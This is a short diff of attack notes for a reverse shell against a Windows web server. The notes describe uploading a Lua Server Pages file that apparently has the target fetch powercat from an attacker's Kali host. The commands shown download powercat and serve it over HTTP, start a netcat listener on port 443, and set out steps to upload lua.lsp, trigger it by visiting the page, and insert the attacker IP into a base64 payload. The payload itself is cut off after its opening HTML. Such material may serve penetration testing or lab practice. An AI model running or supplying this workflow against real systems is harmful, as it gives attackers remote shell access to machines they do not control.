@@ -1,13 +1,15 @@
-# Lua.lsp uploaded to windows target uses powercat hosted on kali for reverse shell.
+# Lua.lsp uploaded to windows target uses powercat and netcathosted on kali for reverse shell.
 
 # Download powercat to kali
-# wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 -O ./powercat.ps1
+wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 -O ./powercat.ps1
 # Host powercat.ps1 on kali
 python3 -m http.server 80
 # Start listener on port 443 on kali
-
 nc -lvnp 443
+# Upload lua.lsp (script shown below) to windows target
+# Visit http://target/lua.lsp to trigger script.
 
+################### Save everything below to a file called lua.lsp replacing YOUR_IP in the base64 encoded string.
 <div style="margin-left:auto;margin-right:auto;width:350px;">
 <div id="info">
 <h2>Lua Server Pages Reverse Shell</h2>
